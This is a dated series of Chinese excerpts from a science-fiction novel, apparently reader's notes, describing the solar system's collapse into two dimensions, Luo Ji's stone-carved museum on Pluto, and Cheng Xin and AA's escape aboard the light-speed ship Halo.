<p>好像白Ice的最后一句话起了作用，瓦西里沉默地盯着他看了几秒钟，缓缓点头，“好吧，博士，听你的。‘启示’号离开纸条，与它拉开一千千米的距离，只在它附近留下一艘太空艇监视……要不，两千千米？”白Ice松开抓着瓦西里的手，擦擦额头说：“你看着办吧，反正远些好，我会尽快写一个正式报告，把我的推测上报总部。”说完，他跌跌撞撞地飘走了。</p>
<p>2016-01-30</p>
<p>在“启示”号上，白Ice把自己关在实验舱中，在身边打开了十几个信息窗口，都与飞船的量子主机相连，开始进行大量的计算。窗口中显示着密密麻麻的方程、矩阵和曲线，他被这些窗口围在中间，焦躁不安，像掉进陷阱的困兽。</p>
<p>与“启示”号分离五十个小时左右后，纸条发出的引力波完全消失了，它发出的白光闪烁了两下也熄灭了，这就意味着纸条的消失。“它完全蒸发了吗？”瓦西里问。</p>
<p>“应该不会，只是已经看不到了。”白Ice疲惫地摇摇头，把自己周围的信息窗口一个接一个地关闭。又过了一个小时，所有的监测都没有发现纸条的丝毫踪迹，瓦西里命令两千千米外留下监视的太空艇返回“启示”号，但太空艇中两名值班的监视人员并没有回答返回的指令，只听到他们急促的对话：</p>
<p>“看下面，怎么回事？！”“它在升起来！”</p>
<p>“别接触它！快出去！”“我的腿！啊——”</p>
<p>在一声惨叫后，从“启示”号上的监视器中可以看到两名监视员中的一名从太空艇中飞出，开动太空服上的推进器试图逃离。与此同时，一片强光亮起，光是从太空艇的底部发出的，那里在熔化！太空艇仿佛是放在滚烫的玻璃上的一块冰激凌，底部熔成一摊，向各个方向扩散。那块“玻璃”是看不到的，只有太空艇熔化后摊开的部分才能显示出那个无形平面的存在。熔化物在平面上成极薄的一层，发出妖艳的彩光，像撒在平面上的焰火。那名监视员飞出了一段，却又像被某种引力拉向那个熔化物标示出的平面，很快他的脚接触到平面，立刻也熔化成光灿灿的一片，他身体的其余部分也在向平面铺去，只发出一声戛然而止的惊叫。“所有人员进入过载位，现有发动机姿态，前进四！”</p>
<p>在从信息窗口中看到监视员的脚接触无形平面的一刹那，瓦西里越过“启示”号船长，果断地发出了这个指令，让“启示”号迅速离开。“启示”号不是恒星级飞船，它在前进四推进时内部人员不需要深海液的保护，但加速的超重还是把每个人死死压在座位上。由于指令发出太快，有些人没来得及进入座位，跌落到船尾受了伤。“启示”号的推进器喷出长达几千米的等离子体火流，刺破黑暗的太空，但在远方太空艇熔化的地方，仍能看到那片幽幽的光亮，像荒野中的磷火。从监视器的放大画面中可以看到，太空艇只剩下顶部的一小部分，但很快也完全消失在那块绚丽的平面中。监视员的身体完全摊在平面上，显示出一个巨大的发光人形，不过，他的身体在平面上已成为没有厚度的一片，虽然大，却只有面积没有体积了。</p>
<p>“我们没有动，飞船没有加速。”“启示”号的领航员说，在超重中他说话很吃力。“你在胡说什么？！”瓦西里想大吼，但超重中也只能低声说出。</p>
<p>从常识上看，领航员确实在胡说，飞船上的每个人都被加速过载死死压住，这证明“启示”号在大功率加速中。在太空中凭视觉判断所在飞行器的运动状态是不可能的，因为可参照天体的距离都很遥远，视行差在短时间根本看不出来，但飞船的导航系统可以观测到飞船很小的加速和运动，这种判断是不会错的。“启示”号有过载却无加速，像被某种力量钉死在太空中。</p>
<p>“其实有加速，只是这一区域的空间在反方向流动，把加速抵消了。”白Ice无力地说。“空间流动？向哪儿流？”</p>
<p>“当然是那里。”超重中白Ice无力举手去指，但人们都知道他说的方向，“启示”号陷入死寂中。本来，超重使人们有一种安全感，像是在某种保护力量的怀抱中逃离危险，但现在，它变成了坟墓一般的压迫，令人窒息。</p>
<p>“请把与总部的通信信道打开，没有时间了，就当是我们的正式汇报吧。”白Ice说。“已经打开了。”</p>
<p>“将军，你曾说过那东西‘什么都不是，里面什么都没有’，其实你是对的，它真的什么都不是，里面什么都没有，它只是一片空间，与我们周围什么都不是、什么都没有的空间是一样的，唯一的区别是：它是二维的，它不是一块，而是一片，没有厚度的一片。”“它没有蒸发吗？”</p>
<p>“蒸发的是它的封装力场，这种封装力场把那片二维空间与周围的三维空间隔开了，现在两者全接触了。你们还记得‘蓝色空间’号和‘万有引力’号看到的吗？”没有人回答，但他们当然记得，四维空间向三维跌落，像瀑布流下悬崖。</p>
<p>“同四维跌落到三维一样，三维空间也会向二维空间跌落，有一个维度蜷缩到微观中。那一小片二维空间的面积——它只有面积——会迅速扩大，这又引发了更大规模的跌落……我们现在就处在向二维跌落的空间中，最终，整个太阳系将跌落到二维，也就是说，太阳系将变成一幅厚度为零的画。”“可以逃离吗？”</p>
<p>“现在逃离，就像在瀑布顶端附近的河面上划船，除非超过一个逃逸速度，否则不论怎样划，迟早都会坠入瀑布，就像在地面向上扔石头，不管扔多高总会落回来。整个太阳系都在跌落区，从中逃离必须达到逃逸速度。”</p>
<p>2016-01-30</p>
<p>逃逸速度是多少？”</p>
<p>“我反复计算过四遍，应该没错。”“逃逸速度是多少？！”</p>
<p>“启示”号和“阿拉斯加”号上的人们屏息凝神，替全人类倾听末日判决，白Ice把这判决平静地说出来：“光速。”</p>
<p>导航系统显示，“启示”号已经出现了与推进方向相反的负加速，开始向二维平面所在的方向移动，速度很慢，但渐渐加快。发动机仍在全功率开动，这样可以减缓飞船跌落的速度，推迟最后结局的到来。在两千千米外的二维平面上，二维化的太空艇和监视员的人体发出的光已经熄灭，与从四维向三维跌落相比，三维跌落到二维释放的能量要小许多。两个二维体的结构在星光下清晰地显现出来：在二维化的太空艇上，可以看到二维展开后的三维构造，可以分辨出座舱和聚变发动机等部分，还有座舱中那个卷曲的人体。在另一个二维化的人体上，可以清楚地分辨出骨骼和脉络，也可以认出身体的各个部位。在二维化的过程中，三维物体上的每个点都按照精确的几何规则投射到二维平面上，以至于这个二维体成为原三维太空艇和三维人体的两张最完整最精确的图纸，其所有的内部结构都在平面上排列出来，没有任何隐藏，但其映射规程与工程制图完全不同，从视觉上很难凭想象复原原来的三维形状。与工程图纸最大的不同是，二维展开是在各个尺度层面上进行的，曾经隐藏在三维构型中的所有结构和细节都在二维平面排列出来，于是也呈现了从四维空间看三维世界时的无限细节。这很像几何学中的分形图案，把图中的任何部分放大，仍然具有同样的复杂度，但分形图案只是一个理论概念，实际的图案受分辨率限制，放大到一定程度后就失去了分形性质；而二维化后的三维物体的无限复杂度却是真实的，它的分辨率直达基本粒子尺度。在飞船的监视器上，肉眼只能看到有限的尺度层次，但其复杂和精细已经令人目眩；这是宇宙中最复杂的图形，盯着看久了会让人发疯的。</p>
<p>但现在，太空艇和监视员的厚度都为零。</p>
<p>2016-01-30</p>
<p>不知道现在二维平面已经扩展到多大的面积，只有那两片图形显示出它的存在。</p>
<p>“启示”号加速滑向二维平面，滑向那厚度为零的深渊。“各位，不要沮丧，太阳系内没有人能逃脱，甚至一个细菌一个病毒都不能幸存，都将成为这张巨画的一部分。”白Ice说，他现在看起来从容淡定。</p>
<p>“停止加速吧。”瓦西里说，“不在乎这点时间了，最后至少让我们轻松呼吸一会儿。”“启示”号的发动机关闭了，飞船尾部的等离子体火柱消失，飞船飘浮在寂静的太空中。其实，飞船现在仍在向二维平面方向加速，但由于是随周围的空间一起运动，飞船里的人们感觉不到加速产生的过载，他们都处于失重中，惬意地呼吸着。</p>
<p>“各位，知道我想到了什么？云天明的童话故事，针眼画师的画。”白Ice说。“启示”号上只有一小部分人知道云天明情报的事，现在，仅仅一瞬间，这些人都明白了这个情节的真实含义。这是一个单独的隐喻，没有任何含义坐标，因为它太简单太直接了。很可能，云天明认为自己把如此明显的隐喻放入故事是一个大冒险，但他冒了这个险，因为这个情报极其重要。</p>
<p>但他还是高估了人们的理解力。他可能认为，有了“蓝色空间”号和“万有引力”号的发现，人们能够解读这个隐喻。这一关键情报的缺失，使人类把希望寄托于掩体工程。</p>
<p>2016-01-30</p>
<p>人类已经观测到的两次黑暗森林打击确实都来自光粒，但人们忽略了一个事实：这两个星系与太阳系有着不同的结构，187J3X1有四颗类木巨行星，但它们的运行轨道半径极小（以公元世纪的观测技术也只能发现这样的太阳系外行星），平均仅为木星与太阳距离的百分之三，比水星与太阳的距离还近，几乎紧贴恒星，在恒星爆发时将被完全摧毁，不能用作掩体；而三体星系，只有一颗行星。</p>
<p>恒星的行星结构是一个能够在宇宙中远程观测到的星系特征，这种观测对于高技术文明而言可能瞟一眼就行了。人类知道掩体，难道它们就不知道？</p>
<p>弱小和无知不是生存的障碍，傲慢才是。“启示”号距二维平面已经不到一千千米了，它坠落的速度越来越快。</p>
<p>“谢谢各位的尽职尽责，我们虽在一起时间不长，但合作得很愉快。”瓦西里说。“也谢谢所有的人，我们曾一同生活在太阳系。”白Ice说。</p>
<p>“启示”号坠入二维空间，它被二维化的速度很快，只有几秒钟，焰火般的光芒再一次照亮了黑暗的太空。这是一幅面积广阔的二维图画，从十万千米外的“阿拉斯加”号上可以清晰地观察到。在这幅图画上，可以清楚地分辨出“启示”号上的每一个人，他们手拉手拥聚在一起，躯体中的每一个细胞都以二维状态袒露在太空中，成为毁灭巨画中最先被画入的人。</p>
<p>掩体纪元67年，冥王星</p>
<p>2016-01-31</p>
<p>“最初是搞一个挺大的研究项目，研究怎样把信息在地质纪年长度的时间里保存。最初定的标准是十亿年。哈，十亿年，开始时那些白痴还以为这挺容易，本来嘛，都能建掩体世界了，这算什么？但很快他们发现，现代的量子存储器，就是那种一粒米大小可以放下一个大型图书馆的东西，里面的信息最多只能保存两千年左右，两千年后因为内部的什么衰变就不能读取了。其实这还是说那些质量最好的存储器，根据研究，现有的普通量子存储器，有三分之二在五百年内就会坏。这下很有意思，本来我们干的这事是那种有闲心的人才干的很超脱的事，一下子成了现实问题，五百年已经有些现实了，我们这不都是四百多年前的人吗？政府立刻命令博物馆的研究停下来，转而研究怎样备份现代的重要数据，让它们至少在五个世纪后还能读出来，呵呵……后来，从我这里分出一个研究机构，我们才能继续研究博物馆，或者说墓碑。</p>
<p>“科学家发现，要论信息保存的时间，咱们那个时候的存储器还好些，他们找了些公元世纪的U盘和硬盘，有些居然还能读出来。据实验，这些存储器如果质量好，可以把信息保存五千年左右；特别是我们那时的光盘，如果用特殊金属材料制造，能可靠地保存信息十万年。但这些都不如印刷品，质量好的印刷品，用特殊的合成纸张和油墨，二十万年后仍能阅读。但这就到头了，就是说，我们通常用来存储信息的手段，最多只能把信息可靠地保存二十万年。而他们要存十亿年！“我们向政府汇报说，按现有的技术，把10G的图形图像信息和1G的文字信息（这是博物馆工程所要求的最基本的信息量）保存十亿年是不可能的，他们不相信，但我们证明了真的不可能，于是他们把保存时间降到一亿年。”</p>
<p>“但这也是一件极其困难的事。学者们开始寻找那些在漫长的时间中保存下来的信息。史前古陶器上的图案，保存了一万年左右；欧洲岩洞里发现的壁画，大约有四万年的历史；人类的人猿祖先为制造工具在石头上砸出的刻痕，如果也算信息的话，最早在上新世中期出现，距今约二百五十万年。可你别说，还真的找到了一亿年前留下来的信息，当然不是人类留下的，是恐龙的脚印。“研究继续进行，但没有什么进展，科学家们显然已经有了一些结论，但在我面前总是欲言又止。我对他们说，没什么，不管你们得出的结果多么离奇或离谱，没有其他的结果，我们就应该接受。我向他们保证，不会有什么东西比我的经历更离奇和离谱的，我不会笑话他们。于是他们告诉我，基于现代科学在各个学科最先进的理论和技术，根据大量的理论研究和实验的结果，通过对大量方案的综合分析和比较，他们已经得出了把信息保存一亿年左右的方法，他们强调，这是目前已知的唯一可行的方法，它就是——”罗辑把拐杖高举过头，白发长须舞动着，看上去像分开红海的摩西，庄严地喊道，“把字刻在石头上！</p>
<p>2016-01-31</p>
<p>后面专门为这些灯供电的部分就更大了，像一座发电厂。这灯可是一项了不起的成果，它内部没有灯丝，也没有激发气体，我不知道发亮的是什么，但能够连续亮十万年！还有你们进来时的那两扇大门，在静止状态下，预计在五十万年的时间里能够正常开启，时间再长就不行了，变形了，那时要再有人进来，就得把门破坏掉。在那时，这些灯都已经灭了有四十万年了，这里一片黑暗。但对于一亿年而言，那只是开始……”</p>
<p>2016-01-31</p>
<p>是啊，能说什么呢？文明像一场五千年的狂奔，不断的进步推动着更快的进步，无数的奇迹催生出更大的奇迹，人类似乎拥有了神一般的力量……但最后发现，真正的力量在时间手里，留下脚印比创造世界更难，在这文明的尽头，他们也只能做远古的婴儿时代做过的事。</p>
<p>把字刻在石头上。</p>
<p>2016-01-31</p>
<p>“我常来这里散步，想一些很有意思的事儿——”罗辑停住脚步，用拐杖指着一幅身着铠甲手持长矛的古代军人浮雕，“这是亚历山大东征，那时他要是再向前走一段，就能在战国晚期与秦相遇，那会发生什么事？现在会是什么样？”再向前走一段后，他又用拐杖向洞壁指指点点，这时，刻在上面的文字已经由小篆变成隶书，“哦，到汉朝了，从这儿到后面那一段，中国完成了两次统一，领土的统一和思想的统一，对整个人类文明来说，这是不是好事？特别是汉朝的独尊儒术，如果换成春秋那样的百家争鸣，那以后又会发生什么，现在又会是什么样？”他用拐杖在空中画了一个大圈，“在每一个历史断面上，你都能找到一大堆丢失的机遇。”</p>
<p>“像人生。”程心轻声说。“哦，不不不，”罗辑连连摇头，“至少对我来说不像，我可是什么都没丢掉，呵呵。”他关切地看着程心，“孩子，你觉得自己丢失了很多？那以后可不要再丢失了。”</p>
<p>“没有以后了。”AA冷冷地说，心想这人到底有些老糊涂了。</p>
<p>2016-01-31</p>
<p>罗辑从扔在一只箱子上的一件工作服中拿出一把小刀和一个改锥，递给她们，“主要是画框大，把框拆了。”</p>
<p>AA拿起改锥正要撬画框，程心低低惊叫一声，“啊，不。”她们看到，这幅画竟是凡·高的《星空》。程心吃惊并不仅仅因为画的珍贵，她曾经看过这幅画。那是在四个世纪前，她刚去PIA报到不久。在一个周末，她去了曼哈顿的纽约现代艺术馆，就在那里看到了凡·高的几幅画。她印象最深的是凡·高对空间的表现，在他的潜意识中，空间肯定是有结构的。程心当时对理论物理知道得不多，但知道按照弦论，空间与实体一样，也是由无数振动着的微弦构成的，而凡·高画出了这些弦。在他的画中，空间与山、麦田、房屋和树一样，也充满了细微的躁动，给她印象最深的就是《星空》，没想到她竟在四个世纪后的冥王星上见到了它。</p>
<p>“拆吧拆吧，这样可以多拿些。”罗辑不以为然地挥挥拐杖说，“你们还以为这些玩意儿价值连城啊？现在连城本身都一钱不值了。”于是，她们把画从那个可能有五个世纪历史的画框上拆下来，但仍保留着硬衬底，以免画布弯折后弄坏画面。然后她们继续拆别的油画，很快空画框就堆了一地。罗辑不知什么时候走了过来，把手放到一幅不大的油画上。</p>
<p>“这幅给我留下吧。”程心和AA把那幅画搬到一旁，在一只靠墙的箱子上放好，她们离开时回头扫了一眼，又小小地吃了一惊。</p>
<p>那幅画是《蒙娜丽莎》。程心和AA继续埋头拆画，AA低声说：“这老家伙很精，留下了最贵的一幅。”</p>
<p>“应该不是这个原因。”“也许他爱过一个叫蒙娜丽莎的女人？”</p>
<p>罗辑坐在《蒙娜丽莎》旁边，一只老手抚摸着古老的画框，喃喃自语：“我不知道你在这儿，知道的话我会常来看你的。”听到声音程心抬起头来，看到老罗辑并没有看《蒙娜丽莎》，他的双眼平视着前方，像是看着时光的深处。不知是不是错觉，程心竟看到那双深陷的老眼中有了泪光。</p>
<p>在冥王星地下的宏伟墓室中，在昏暗的能亮十万年的灯光中，蒙娜丽莎的微笑若隐若现，这微笑使人们困惑了九个世纪，现在则显得更加神秘诡异，似乎包容一切，又似乎一无所有，像正在逼近的死神。</p>
<p>掩体纪元67年，二维太阳系</p>
<p>2016-01-31</p>
<p>在打开外侧门时，过渡段中的一点空气立刻在冥王星的严寒中被冻成一片飞舞闪亮的冰晶。她们开始以为照亮冰晶的是“星环”号上的探照灯，但当冰晶飞散后，她们发现远处“星环”号上的探照灯已经关闭了，来自太空的光芒照耀着冥王星的大地，使“星环”号和黑色方碑在白色的地面上投下长长的影子。她们抬头仰望，立刻在惊骇中后退了两步。</p>
<p>太空中有一双大眼睛在盯着她们。那是两个发光的椭圆形，其结构像极了眼睛，都有白色或淡黄色的眼白和深色的眼球。</p>
<p>“那个是海王星，那个是天……哦不，是土星！”AA指着天空说。两颗类木巨行星已经被二维化。天王星的轨道在土星之外，但由于前者目前正处于太阳的另一侧，首先跌落到二维的是土星。二维化后的巨行星应该是圆形，只是从冥王星上看，视线与二维空间平面有一个角度，于是它们在视野中变成了椭圆。两颗二维行星呈现出清晰的环层结构。二维海王星主要有三个环区，最外层是蓝色的环，看上去十分艳丽，像这只眼睛的睫毛和眼影，那是由氢气和氦气构成的大气层；中部是白色环，这是海王星厚达两万千米的地幔，曾被行星天文学家称为水-氨大洋；中心的深色区是行星核，由岩石和冰组成，质量相当于一个地球。二维土星的结构类似，只是外侧没有蓝色环。每个大环区中还有无数更细小的环区，构成精细的结构。细看时，这两只巨眼变得像两个年轮，刚刚锯断的大树露出的那种崭新的年轮。每颗二维行星的附近都有十几个小圆形，那是它们被二维化的卫星。土星外侧还有淡淡的一个大圆，是二维化的土星环。太空中仍能够找到太阳，仍然是一个刚能看出形状的小圆盘，发出无力的黄光；而两颗行星远在太阳的另一侧，可见它们二维化后面积的巨大。但两颗二维行星没有体积，它们厚度为零。</p>
<p>2016-01-31</p>
<p>AA请求A.I.筛选出一些有内容的画面，A.I.问她们想要哪方面的信息，程心说要太空城方面的。泛滥的窗口被瞬间清空，很快出现了有序排列的十几个窗口，其中的一个窗口放大到最前方，A.I.介绍说这是十二小时前海王星群落中欧洲六号太空城的画面，该太空城原属于一个城市组合体，打击警报公布后组合体解体。</p>
<p>2016-01-31</p>
<p>摄像机继续向平面坠落，程心紧盯着越来越近的二维城市，想在城市中找出活动的迹象，但是没有，除了刚才在火焰中的变形外，二维城市中的一切都处于静止状态，那些二维人体同样一动不动，没有任何生命的迹象。</p>
<p>这是一个死的世界，一张死的画。</p>
<p>2016-01-31</p>
<p>走出飞船，她们发现两颗二维巨行星仍悬在太空中，但变暗了许多，这使得它们下方新出现的一长条光带显得十分醒目。那条光带是由无数单独的小光斑连成的，连绵着横贯整个天空，像太阳系的一条新项链。</p>
<p>“那是小行星带吧？”程心问。“应该是，下面该轮到火星了吧。”AA说。</p>
<p>“火星现在在太阳的这一侧呢。”程心最后这句话让两人沉默下来，她们不再看二维化的小行星链，默默地向黑色方碑走去。</p>
<p>下面该轮到地球了。</p>
<p>2016-01-31</p>
<p>三人搬着文物箱，沉默地走向“星环”号。悲伤还没有袭来，就像被利刃划开的伤口，一时还感觉不到痛。</p>
<p>2016-01-31</p>
<p>二维地球还是显示出了她的奇观，在她的最外缘渐渐出现了一圈白色的环，最初只是隐约可见，但很快变得清晰醒目了。那道环洁白无瑕，但质地并不是均匀的，好像由无数细小的白色颗粒构成。</p>
<p>2016-01-31</p>
<p>他们再次细看这幅望远镜头拍摄的全息图像，二维地球的主体拍得很清晰，上面的“年轮”比肉眼看时更加细密，可能跌落已经完成，二维地球正在暗下来。令他们震惊的是冰冻的二维海洋——在最外侧环绕二维地球的白色冰环，他们可以清晰地分辨出组成冰环的颗粒，那竟是——雪花！大得难以想象的雪花，不会是别的东西，它们都呈规则的六边形，但晶枝的形状各异，晶莹剔透，精美绝伦。在五十个天文单位远处看到雪花本来就有一种强烈的不真实感，而这些超巨型的雪花还在平面上平行排列，绝无重叠，更加剧了这种不真实，这似乎是一种对雪花完全图案化的艺术表现，具有强烈的装饰效果，使得冰冻的二维海洋看上去像一件舞台艺术品。</p>
<p>“那些雪花有多大？”AA问。“它们的直径大多在四千千米至五千千米之间。”飞船A.I.仍然用平淡刻板的声音回答，它没有惊奇的功能。</p>
<p>2016-01-31</p>
<p>回到地下大厅后，程心和AA草草收集了一批文物，并没有挑选。程心想拿上尼安德特人的头骨，但AA把它扔到一边。</p>
<p>“以后，在这幅大画上二维头骨多的是。”AA说。程心觉得她说的有道理，最早的尼安德特人距今不过十几万年，按乐观的预测，二维的太阳系在几百万年后有第一批观察者，在“他们”眼中，尼安德特人与现代人已经是同一时代的物种了。再看看别的文物，程心也感觉心灰意冷，无论是对现在的自己还是对遥远未来的“他们”，这些东西还不如正在毁灭的现实世界有意义。</p>
<p>她们最后看了一眼昏暗的大厅，抬着文物离开了。画中的蒙娜丽莎看着她们的背影，邪恶而诡异地微笑着。</p>
<p>2016-01-31</p>
<p>太阳接触二维平面的一刹那，跌入二维的部分就在平面上呈圆形迅速扩展开来，很快，平面上二维太阳的直径就超过了三维太阳，这一过程只用了三十秒左右，以太阳半径七十万千米计算，二维太阳边缘的扩展速度竟达到每秒两万多千米。二维太阳继续扩大，很快在平面上形成了一片广阔的火海，三维太阳就在这血色火海的中央缓缓沉下去。</p>
<p>四个世纪前，在红岸基地的峰顶，叶文洁在她生命的最后时刻曾看到过这样的日落。那时，她的心脏艰难地跳动着，像一根即将断裂的琴弦。黑雾开始在她的眼前出现，西方的天际，正在云海中下沉的夕阳仿佛融化着，太阳的血在云海和太空中弥漫开来，映现出一大片壮丽的血红。她说这是人类的落日。现在，太阳真的在融化，把它的血铺展在二维平面中，这是最后一次日落。</p>
<p>远处，降落场外的大地上有大片白色蒸汽出现，冥王星上的固态氮和氨开始蒸发，新出现的稀薄的大气层对光有了散射，天空的背景不再漆黑一片，而是现出淡淡的紫色。</p>
<p>2016-01-31</p>
<p>一个小时后，太阳完全坠入二维平面。</p>
<p>从冥王星上看去，二维太阳是一个巨大的椭圆，与它相比，二维行星只是几块小小的碎片。与后者不同，二维太阳没有清晰的“年轮”，它只是大致分为三个环层：中心部分发出明亮的光芒，看不清细节，这一部分可能对应着三维太阳的核心聚变区；从核心向外的一个广阔的环区可能对应着三维太阳的辐射区，这是一片沸腾的二维海洋，在炽热的红光中，无数细胞状的细小结构飞快地生成、消失、分裂和组合，从局部看混乱且躁动不安，但整体上却形成某种宏伟的秩序和模式；再向外是三维太阳的对流区，像三维太阳一样，这个区域通过恒星物质的对流与二维太空进行着热量传递，与里侧辐射区的混沌不同，对流区呈现着一个十分有序的结构，可以看到许多整齐排列的环状对流回路在运行，大小和形状都十分相似；最外面是太阳的大气，金色的气流越出了太阳的圆周边缘，形成了大量的二维日珥，像围绕着二维太阳的一圈曼妙舞者，在二维太空中变幻着千万种汪洋恣意的舞姿，有些“舞者”脱离了太阳，在二维太空中远远飘去。“太阳在那里还活着？”AA问道，她说出了三个人共同的希冀，他们都希望太阳能够继续照耀着二维太阳系，尽管那里已经没有生命。</p>
<p>但这只是希冀而已。二维太阳在暗下去。核心区的光度在急剧降低，很快暗到可以看出其中更多的环层结构；辐射区也在变暗，沸腾平息下来，变成黏滞的蠕动；对流区的对流环都在变形崩溃，很快就完全消失；二维太阳外围那一圈金色的气体舞者则像枯萎的叶子般黯淡下来，失去了活力。这时可以看出，在二维世界至少万有引力还存在，那些在太空中飞扬的日珥失去了辐射的支撑，被二维太阳的引力慢慢拉回去，“舞者”们屈服于重力，一个个无力地倒下，太阳大气最后变成了最外侧平平的一个环圈。随着太阳的熄灭，二维行星被照亮的弧边也暗下来了，二维地球由蒸发的海洋形成的长发也失去了光辉。</p>
<p>三维世界的一切跌入二维后都将死去，没有什么能够活在厚度为零的画中。</p>
<p>2016-01-31</p>
<p>这时，冥王星上也出现了雪花，是小雪花，从淡紫色的天空中飘落。这是太阳二维化时被蒸发的氮和氨，随着二维太阳的熄灭，温度急剧降低，短命的氮氨大气被冻结成雪花。雪越下越大，很快在方碑和“星环”号的顶部积起了厚厚的一层。虽然没有云，但密密的飞雪使冥王星的天空变得模糊了，二维太阳和行星在雪幕之后变得朦朦胧胧，雪使世界暂时变得窄小了。</p>
<p>“你们有没有回家的感觉？”AA在雪中举起双手转着圈说。“嗯，我正想这么说呢。”程心深有同感地点点头。和AA一样，在她的印象中，雪似乎只是地球上才有的东西，刚才在二维地球周围看到的大雪花更加深了她的这个印象。这场在太阳系边缘的冷暗世界中的雪，使她感到了一丝母星的温暖。</p>
<p>2016-01-31</p>
<p>罗辑看到了她们伸手抚摸飞雪的动作，有些担心地说：“我说你们两个，不会把手套摘下来吧？”</p>
<p>程心确实有用不戴手套的手接雪花的冲动，她想感受那丝丝的清凉，看着晶莹的雪花在自己的体温中融化……但理智当然制止她这样做，如果她真的摘下手套，地球的感觉将在瞬间消失，同时失去的还有她的那只手。那些氮氨雪花的温度是摄氏零下二百一十度，这是氮冻结的温度，在这样的酷寒中，她那只纤手很快会被冻得像玻璃一样脆。“孩子们，没有家了，家已经变成一幅画了。”罗辑拄着拐杖摇摇头说。</p>
<p>这场氮氨大雪持续的时间不长，空中飘落的雪花渐渐稀疏，氮氨大气带来的紫色已经消失，天空重新变得黑暗清澈。可以看到，与下雪前相比，二维太阳和行星都变大了一些，这不是它们在继续膨胀，它们的二维化已经完成，面积已经恒定，这只是表明冥王星向着二维平面又靠近了一些。</p>
<p>2016-01-31</p>
<p>程心犹豫了一下，点了点头，“那好吧，我们走了，一定要保持联系啊！”</p>
<p>“当然，保持联系。”罗辑对她们举起拐杖以示告别，然后转身向方碑走去。低重力之下，他像是在雪地上飘行，不时用拐杖点地以减慢速度。程心和AA目送着他，直到这位面壁者、执剑人和人类最后的守墓人老迈的身影消失在方碑的大门中</p>
<p>2016-01-31</p>
<p>程心和AA返回“星环”号，飞船立刻起飞，推进器激起漫天的雪雾，很快达到了冥王星仅每秒一千米多的逃逸速度，进入太空轨道。从舷窗和监视画面中她们看到，冥王星原来蓝黑相间的表面现在又多了大片的雪白，用各种语言刻在大地上的“地球文明”的巨字被雪覆盖，几乎认不出来了。“星环”号从冥王星和它的卫星卡戎之间穿过，这两个天体相距如此之近，有穿过峡谷的感觉。</p>
<p>就在这道“峡谷”中，有许多逃亡飞船形成的移动的星星，它们的速度都比“星环”号要快许多。有一艘飞船从近处飞速超过“星环”号，距离不超过一百千米，推进器的光芒照亮了卡戎平滑的表面，可以清晰地看到它那三角形的船体，以及推进器喷出的近十千米长的蓝色火焰。</p>
<p>2016-01-31</p>
<p>星环”号飞出冥王星和卡戎构成的峡谷，把两个暗冷的世界甩在后面，飞进浩渺的太空。这时，她们看到了二维太阳的全貌，木星的二维化已经基本完成，现在，除了天王星，太阳系的绝大部分都已经二维化。</p>
<p>“天啊，星空！”AA失声喊道。程心知道她说的是凡·高的《星空》。像啊，太像了。她脑海中那幅画的记忆，与眼前的二维太阳系几乎完美地重叠在一起。太空中充满了巨大的星体，这星体所占的面积甚至大于它们之间空间的面积，但星体的巨大并没有给它们带来实在感，它们像是时空的旋涡。宇宙中，空间的每一处微小的部分都在惊惧和疯狂中流动着、翻滚着、颤抖着，像燃烧的火焰，却只散发出酷寒。太阳和行星，所有的实体和存在，只是这时空乱流产生的幻象。</p>
<p>程心现在回想起两次看到《星空》时奇怪的感觉：画面中星空之外的部分，那火焰般的树，暗夜中的村庄和山脉，都呈现出明显的透视和纵深；但上方的星空却丝毫没有立体感，像挂在夜空中的一幅巨画。因为星空是二维的。</p>
<p>他是怎么画出来的？1889年的凡·高，精神第二次崩溃的凡·高，难道真的用分裂和谵妄的意识，跨越五个多世纪的时空，看到了现在？！或者反过来，他早就看到了未来，这最后审判日的景象才是他精神崩溃和自杀的真正原因？！</p>
<p>2016-01-31</p>
<p>“您好！我们准备把那些文物扔到太空中去，但我们想留下《星空》。”AA说。</p>
<p>“都留下吧，不要扔了，带上它们，走吧。”这话令程心和AA很惊奇，她们对视了一眼。AA问道：“走？去哪儿？”</p>
<p>“去哪儿都行，你们可以去银河系的任何地方，甚至可以在有生之年飞到仙女座星云去。‘星环’号能够以光速航行，它安装了世界上唯一一套空间曲率驱动引擎。”震惊令程心和AA说不出话来。“维德死后，星环城的残余力量没有放弃努力，后来，又不断有人从监狱里释放出来，他们开始建设另一个秘密研究基地，知道在哪里吗？水星。那里也是太阳系人迹罕至的地方。四个世纪前，那个面壁者，那个叫雷迪亚兹的，用巨型氢弹在水星上炸了一个大坑。基地就建在那个坑里，建设过程用了三十多年，最后坑用一个大穹顶盖上了，对外宣称是一个研究太阳活动的机构。你们的星环集团后来也恢复运作，有了些发展，可以把基地维持下去。”</p>
<p>2016-01-31</p>
<p>维德死后第三十五年，空间曲率驱动的研究在水星基地恢复了，就从把你那截三毫米的头发驱动两厘米的阶段开始。研究持续了半个世纪，其间因各种原因有过几次中断，渐渐由理论研究过渡到技术开发。这期间的艰难和曲折我就不说了。在技术开发的最后阶段，需要进行大规模的曲率驱动实验。对于水星基地来说，这是一大障碍，一是因为基地的力量有限，难以进行这样的实验；二是一旦进行实验，必然产生大规模的航迹，这就使水星基地的真实目的暴露了。其实，这五十多年来，基地的人员流动很大，联邦政府不可能对水星基地的内幕没有察觉，只是由于研究和实验的规模都很小，且研究都冠以别的名目，他们对此一直容忍了。但要进行大规模实验，必须有政府的合作。我们去找了联邦政府，后来双方合作得很好。”</p>
<p>“禁止光速飞船研究的法律废除了吗？”程心问。“没有，政府与我们合作是因为……”罗辑用拐杖敲击着地面，发出均匀的嗒嗒声——他在犹豫，“这个，暂时还是不说吧。一年前，三套曲率引擎制造完成，共进行了三次无人光速试航，第一次是一号引擎，它在距太阳一百五十天文单位的太空进入光速，以光速航行一段后返回，对于引擎本身来说，试航时间只有十分钟左右，但对我们来说，它们在三年后才返回。第二次试航是二号和三号引擎同时进行，现在，那两套引擎已经在奥尔特星云之外，预计返回太阳系要在六年后了。安装在‘星环’号上的是经过第一次试航的一号引擎。”</p>
<p>2016-01-31</p>
<p>“可是‘星环’号上怎么只有我们两个人，至少应该再带两个男人啊？！”AA对罗辑喊道。</p>
<table>
<thead>
<tr>
<th>注</th>
<th>AA很实在</th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
</tr>
</tbody>
</table>
<p>2016-01-31</p>
